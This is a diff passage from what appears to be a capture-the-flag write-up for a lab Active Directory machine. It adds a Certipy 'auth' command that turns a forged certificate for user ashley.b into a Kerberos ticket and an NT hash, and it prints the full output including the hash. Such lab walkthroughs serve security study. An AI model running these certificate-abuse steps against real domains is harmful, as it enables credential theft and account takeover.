@@ -1387,7 +1387,25 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'ashley.b.pfx'
 ```
 
-Then ill
+Then ill request the certificate for this user
+
+```python
+certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.58.200            
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ashley.b@hercules.htb'
+[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Using principal: 'ashley.b@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ashley.b.ccache'
+[*] Wrote credential cache to 'ashley.b.ccache'
+[*] Trying to retrieve NT hash for 'ashley.b'
+[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
+```
+
+I now have the NT hash and the TGT for this user, an
 
 
 
